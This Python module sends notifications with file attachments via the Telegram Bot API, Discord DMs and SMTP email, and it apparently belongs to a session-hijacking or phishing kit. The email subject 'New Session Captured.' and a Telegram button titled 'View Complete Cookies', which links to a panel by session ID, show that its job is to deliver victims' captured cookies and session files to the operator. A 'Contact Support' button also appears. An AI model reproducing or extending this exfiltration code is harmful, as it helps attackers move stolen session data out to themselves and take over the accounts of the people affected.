"""
Notification Senders - Telegram, Discord, and Email
Same functionality as Go application
"""

import requests
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from typing import Optional

def send_telegram_notification(chat_id: str, token: str, message: str, file_path: str = None, session_id: int = None, web_url: str = None, support_telegram: str = None) -> Optional[int]:
    """
    Send Telegram notification with file attachment and optional inline buttons.
    Returns message ID if successful.
    """
    try:
        import json
        
        # Determine if sending document or message
        if file_path and os.path.exists(file_path):
            # Send document with caption
            url = f"https://api.telegram.org/bot{token}/sendDocument"
            
            with open(file_path, 'rb') as file:
                files = {'document': (os.path.basename(file_path), file)}
                data = {
                    'chat_id': chat_id,
                    'caption': message,
                    'parse_mode': 'MarkdownV2'
                }
                
                # Build inline keyboard buttons
                buttons = []
                
                # Add view cookies button if session_id and web_url are provided
                if session_id and web_url:
                    buttons.append({
                        'text': '🍪 View Complete Cookies',
                        'url': f'{web_url}/?session={session_id}'
                    })
                
                # Add support button if support_telegram is provided
                if support_telegram:
                    support_user = support_telegram.replace('@', '')
                    buttons.append({
                        'text': '💬 Contact Support',
                        'url': f'https://t.me/{support_user}'
                    })
                
                # Add inline keyboard if we have buttons
                if buttons:
                    inline_keyboard = {
                        'inline_keyboard': [buttons]
                    }
                    data['reply_markup'] = json.dumps(inline_keyboard)
                
                response = requests.post(url, files=files, data=data, timeout=30)
        else:
            # Send text message only
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            
            data = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'MarkdownV2'
            }
            
            # Build inline keyboard buttons
            buttons = []
            
            # Add view cookies button if session_id and web_url are provided
            if session_id and web_url:
                buttons.append({
                    'text': '🍪 View Complete Cookies',
                    'url': f'{web_url}/?session={session_id}'
                })
            
            # Add support button if support_telegram is provided
            if support_telegram:
                support_user = support_telegram.replace('@', '')
                buttons.append({
                    'text': '💬 Contact Support',
                    'url': f'https://t.me/{support_user}'
                })
            
            # Add inline keyboard if we have buttons
            if buttons:
                inline_keyboard = {
                    'inline_keyboard': [buttons]
                }
                data['reply_markup'] = json.dumps(inline_keyboard)
            
            response = requests.post(url, data=data, timeout=30)
        
        response.raise_for_status()
        
        result = response.json()
        if result.get('ok'):
            message_id = result.get('result', {}).get('message_id')
            print("[OK] Telegram notification sent successfully")
            return message_id
        else:
            error_desc = result.get('description', 'Unknown error')
            print(f"[ERROR] Telegram error: {error_desc}")
            print(f"[ERROR] Full response: {result}")
            # If MarkdownV2 parsing error, try sending without parse_mode
            if "can't parse entities" in error_desc.lower() or "bad request" in error_desc.lower():
                print("[INFO] Retrying without MarkdownV2 parse_mode...")
                try:
                    if file_path and os.path.exists(file_path):
                        url = f"https://api.telegram.org/bot{token}/sendDocument"
                        with open(file_path, 'rb') as file:
                            files = {'document': (os.path.basename(file_path), file)}
                            data = {
                                'chat_id': chat_id,
                                'caption': message
                            }
                            if buttons:
                                inline_keyboard = {'inline_keyboard': [buttons]}
                                data['reply_markup'] = json.dumps(inline_keyboard)
                            response = requests.post(url, files=files, data=data, timeout=30)
                    else:
                        url = f"https://api.telegram.org/bot{token}/sendMessage"
                        data = {
                            'chat_id': chat_id,
                            'text': message
                        }
                        if buttons:
                            inline_keyboard = {'inline_keyboard': [buttons]}
                            data['reply_markup'] = json.dumps(inline_keyboard)
                        response = requests.post(url, data=data, timeout=30)
                    
                    result = response.json()
                    if result.get('ok'):
                        message_id = result.get('result', {}).get('message_id')
                        print("[OK] Telegram notification sent successfully (without MarkdownV2)")
                        return message_id
                except Exception as retry_e:
                    print(f"[ERROR] Retry failed: {retry_e}")
            return None
            
    except Exception as e:
        print(f"[ERROR] Telegram error: {e}")
        import traceback
        print(f"[ERROR] Traceback: {traceback.format_exc()}")
        return None

def send_discord_notification(user_id: str, token: str, message: str, file_path: str) -> bool:
    """
    Send Discord notification via DM with file attachment.
    Uses Discord HTTP API (simpler than discord.py for this use case).
    """
    try:
        # Create DM channel
        url = f"https://discord.com/api/v10/users/@me/channels"
        headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }
        data = {"recipient_id": user_id}
        
        response = requests.post(url, json=data, headers=headers, timeout=30)
        if response.status_code == 200:
            channel_id = response.json().get("id")
            
            # Send message with file
            url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
            with open(file_path, 'rb') as file:
                files = {'file': (os.path.basename(file_path), file, 'application/octet-stream')}
                data = {'content': message}
                response = requests.post(url, files=files, data=data, headers={
                    "Authorization": f"Bot {token}"
                }, timeout=30)
                response.raise_for_status()
                print("[OK] Discord notification sent successfully")
                return True
        else:
            print(f"[ERROR] Discord error: Failed to create DM channel")
            return False
            
    except Exception as e:
        print(f"[ERROR] Discord error: {e}")
        return False

def send_email_notification(smtp_host: str, smtp_port: int, smtp_user: str, 
                            smtp_password: str, to_email: str, body: str, 
                            attachment_path: str) -> bool:
    """
    Send email notification with attachment.
    Same logic as Go's sendMailNotificationWithAttachment.
    """
    try:
        # Create message
        msg = MIMEMultipart()
        msg['From'] = smtp_user
        msg['To'] = to_email
        msg['Subject'] = "New Session Captured."
        
        # Add body
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        # Add attachment
        with open(attachment_path, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename= {os.path.basename(attachment_path)}'
            )
            msg.attach(part)
        
        # Send email
        server = smtplib.SMTP(smtp_host, smtp_port)
        server.starttls()
        server.login(smtp_user, smtp_password)
        server.send_message(msg)
        server.quit()
        
        print("[OK] Email notification sent successfully")
        return True
        
    except Exception as e:
        print(f"[ERROR] Email error: {e}")
        return False

